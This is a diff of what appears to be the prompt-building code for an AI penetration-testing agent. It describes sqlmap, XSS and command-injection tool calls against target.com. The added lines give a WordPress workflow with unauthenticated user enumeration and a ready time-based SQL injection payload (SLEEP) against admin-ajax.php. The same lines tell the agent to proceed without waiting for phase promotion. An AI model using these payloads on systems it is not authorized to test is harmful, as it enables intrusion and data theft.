@@ -355,7 +355,7 @@ def get_phase_tools(phase: str, post_expl_enabled: bool = False, post_expl_type:
 - **execute_ffuf**: Bounded path fuzz after the browser crawl. Prefer `/opt/wordlists/app-dirs-common.txt` (not huge SecLists DirBuster). Example: execute_ffuf(args="-u https://target.com/FUZZ -w /opt/wordlists/app-dirs-common.txt -mc 200,204,301,302,401,403 -t 20 -rate 50")
 - **execute_sqlmap**: SQL injection automation (exploitation phase). Detects and exploits all major SQLi types: error-based, boolean-blind, time-blind, UNION, stacked queries. Always runs with --batch (non-interactive). Example: execute_sqlmap(args='-u "https://target.com/page?id=1" --dbs') or execute_sqlmap(args='-u "https://target.com/page?id=1" --level=3 --risk=2')
 - **execute_nikto**: Web server vulnerability scanner (exploitation phase). Checks 6,700+ dangerous CGIs, outdated servers, insecure configs, and default files. Example: execute_nikto(args="-h https://target.com -Format json")
-- **execute_wpscan**: WordPress vulnerability scanner (exploitation phase). Detects WP version, plugins, themes, users, and known vulnerabilities. Use when WordPress is detected. Example: execute_wpscan(args="--url https://target.com --enumerate vp,vt,u")
+- **execute_wpscan**: WordPress vulnerability scanner. Runs as soon as WordPress is detected (informational phase OK — this is targeted CMS recon, not a broad spray). Detects WP version, plugins, users, and known CVEs. The WPScan API token is configured server-side (enables vulnerable-plugin CVE mapping). Prefer fast passive plugin detection so it fits the turn budget. Example: execute_wpscan(args="--url https://target.com --enumerate vp,u --plugins-detection passive --random-user-agent")
 - **execute_xsstrike**: Advanced XSS scanner (exploitation phase). Uses fuzzy matching, context analysis, and smart payload generation to find reflected, stored, and DOM XSS. Example: execute_xsstrike(args='-u "https://target.com/search?q=test"') or execute_xsstrike(args='-u "https://target.com/search?q=test" --crawl')
 - **execute_dalfox**: Fast XSS scanner/verifier (exploitation). Prefer for confirmation after xsstrike or on reflected params. Example: execute_dalfox(args='url "https://target.com/search?q=test" --skip-bav')
 - **execute_commix**: OS command-injection automation (exploitation). Use only on high-signal params. Example: execute_commix(args='--url="https://target.com/ping?host=1" --batch')
@@ -444,10 +444,16 @@ The `execute_browser` tool uses Playwright with a real Chromium browser. Use it 
 4. **JavaScript analysis**: `{"actions": [{"action": "navigate", "url": "..."}, {"action": "execute_js", "script": "document.cookie"}]}`
 5. **Screenshot evidence**: `{"actions": [{"action": "navigate", "url": "..."}, {"action": "screenshot"}]}`
 
-**CMS/WordPress workflow:**
-1. `execute_cmseek(args="-u https://target.com")` or `execute_wappalyzer(args="https://target.com")` → detect CMS
-2. If WordPress: `execute_wpscan(args="--url https://target.com --enumerate vp,vt,u")` → WP-specific vulns
-3. `create_finding(...)` for confirmed vulns
+**CMS/WordPress workflow (run as soon as WordPress is fingerprinted — do not wait for WPScan, methodology cards, or phase promotion):**
+1. Fingerprint: `execute_wappalyzer` / `execute_whatweb` / httpx tech-detect
+2. Unauth REST user enum: `execute_curl(args="-sS -D- https://target.com/wp-json/wp/v2/users?per_page=100")`. HTTP 200 with `slug`/`name` is a finding. Call `create_finding` with title, description, severity, target.
+3. Time-based SQLi on `POST /wp-admin/admin-ajax.php` — this is how a human tester finds plugin injection, **not WPScan**. `compare_requests` baseline vs mutant:
+   - headers: `Content-Type: application/x-www-form-urlencoded`
+   - baseline body: `action=loadmore&page=1&query={{"tax_query":{{"0":{{"terms":["1"]}}}}}}`
+   - mutant body: same with `terms=["1) AND (SELECT 1 FROM (SELECT SLEEP(2))x)-- -"]`
+   - timeout=20. A ≥1.5s elapsed delta is `TIME_BASED_INJECTION_CANDIDATE`. Confirm SLEEP(4), then `execute_sqlmap --technique=BT`, then `create_finding` with the timing table.
+4. Login oracle (ONE attempt per username, no brute force): POST `/wp-login.php`.
+5. OPTIONAL: `execute_wpscan` for known plugin CVEs. Skip if it aborts (quota/token). Never block steps 2–3 on WPScan.
 
 **TLS/SSL testing workflow (ALWAYS include for HTTPS targets):**
 1. `execute_testssl(args="https://target.com")` or `execute_sslyze(args="target.com")` → check TLS config
